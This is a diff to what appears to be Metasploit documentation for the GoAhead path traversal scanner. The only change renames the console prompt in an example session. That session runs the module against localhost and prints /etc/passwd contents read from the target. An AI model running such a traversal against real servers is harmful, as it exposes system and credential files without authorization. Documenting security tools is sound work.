@@ -103,12 +103,12 @@ root@kali:/tmp/goahead-3.4.1# build/linux-x64-default/bin/goahead --verbose --ho
 Install from the instructions at the top of this document.
 
 ```
-msf5 > use auxiliary/scanner/http/goahead_traversal 
-msf5 auxiliary(scanner/http/goahead_traversal) > set rhosts 127.0.0.1
+msf > use auxiliary/scanner/http/goahead_traversal 
+msf auxiliary(scanner/http/goahead_traversal) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
-msf5 auxiliary(scanner/http/goahead_traversal) > set depth 5
+msf auxiliary(scanner/http/goahead_traversal) > set depth 5
 depth => 5
-msf5 auxiliary(scanner/http/goahead_traversal) > run
+msf auxiliary(scanner/http/goahead_traversal) > run
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
